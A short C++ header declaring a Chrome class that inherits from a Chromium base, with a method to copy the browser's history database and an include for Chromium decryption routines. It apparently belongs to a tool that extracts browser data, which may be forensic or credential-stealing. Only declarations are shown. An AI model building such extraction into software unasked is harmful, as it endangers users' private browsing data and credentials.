#pragma once
#include <stdio.h>
#include <stdlib.h>
#include <string>
#include <sstream>
#include <windows.h>
#include "Chromium.h"
#include "ChromiumDecrypt.h"
#include "Configuration.h"

namespace Tool 
{
	namespace Browsers
	{
		class Chrome : public Chromium{
		public:
			Chrome(Tool::Configuration::config_t MainContext_t);
			bool CopyHistoryDB();
		};
	}

}